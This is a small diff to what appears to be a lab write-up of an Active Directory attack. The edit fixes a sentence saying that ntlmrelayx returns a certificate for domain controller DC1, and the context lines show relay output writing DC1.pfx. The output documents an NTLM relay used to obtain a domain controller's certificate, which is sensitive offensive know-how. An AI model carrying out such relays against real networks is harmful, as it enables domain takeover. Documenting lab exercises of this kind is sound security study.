@@ -724,7 +724,9 @@ Ill also specify my listener so that ntlmrelayx can relay the auth to dc2
 [*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Writing PKCS#12 certificate to ./DC1.pfx
 [*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Certificate successfully written to file
 ```
-After a moment of running nxc i get a certificate for dc1 back from ntlm
+After a moment of running nxc i get a certificate for dc1 back from ntlmrelayx
+
+
 
 
 
